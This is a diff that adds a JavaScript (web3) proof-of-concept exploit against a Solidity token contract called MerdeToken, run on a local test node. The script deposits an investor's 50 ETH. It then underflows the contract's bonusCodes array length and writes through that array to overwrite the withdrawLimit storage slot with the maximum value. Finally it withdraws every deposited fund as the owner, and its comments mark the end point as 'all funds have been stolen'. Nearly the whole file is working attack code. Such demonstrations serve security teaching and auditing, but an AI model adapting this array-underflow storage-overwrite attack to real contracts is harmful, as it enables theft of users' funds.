@@ -1,0 +1,57 @@
+"use strict";
+
+const fs = require('fs');
+const child_process = require('child_process');
+const Web3 = require('web3');
+
+let web3 = new Web3();
+web3.setProvider(new web3.providers.HttpProvider('http://localhost:8545'));
+
+
+// Accounts (investor must have 50 eth, and all accounts must have enough extra for gas)
+
+let owner = web3.eth.accounts[0];
+let trustedThirdParty = web3.eth.accounts[1];
+let investor = web3.eth.accounts[2];
+
+
+// Compile MerdeToken.sol
+
+let solc_compile = (file) => {
+  let ret = child_process.execSync(`solc --optimize --combined-json abi,asm,ast,bin,bin-runtime,clone-bin,devdoc,interface,opcodes,srcmap,srcmap-runtime,userdoc ${file}`);
+  return JSON.parse("" + ret);
+};
+
+let compiled = solc_compile("MerdeToken.sol");
+let merdeTokenCompiled = compiled.contracts['MerdeToken.sol:MerdeToken'];
+
+let MerdeToken = web3.eth.contract(JSON.parse(merdeTokenCompiled.abi));
+
+
+// Create contract
+
+let merdeTokenInstance = MerdeToken.new(trustedThirdParty, {data: "0x" + merdeTokenCompiled.bin, from: owner, gas: 1000000}, (err, val) => {
+  if (err) { console.log("Error uploading contract: " + err); }
+
+  if (!val.address) return;
+  console.log("Contract address: " + val.address);
+
+  merdeTokenInstance.setWithdrawLimit(web3.toWei(1), { gas: 1000000, from: trustedThirdParty });
+  merdeTokenInstance.deposit({ gas: 1000000, from: investor, value: web3.toWei(50) });
+
+  // Point A: Everything is setup as normal:
+  //   * The trusted 3rd party allows us to withdraw 1 ETH
+  //   * An investor has invested 50 ETH
+
+  merdeTokenInstance.popBonusCode({gas: 1000000, from: web3.eth.coinbase});
+
+  // Point B: bonusCodes array has now underflowed
+
+  merdeTokenInstance.modifyBonusCode("0xfc949c7b4a13586e39d89eead2f38644f9fb3efb5a0490b14f8fc0ceab44c254", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", { gas: 1000000, from: owner });
+
+  // Point C: withdrawLimit has been overwritten with max uint value
+
+  merdeTokenInstance.withdraw(web3.toWei(50), { gas: 1000000, from: owner });
+
+  // Point D: all funds have been stolen
+});
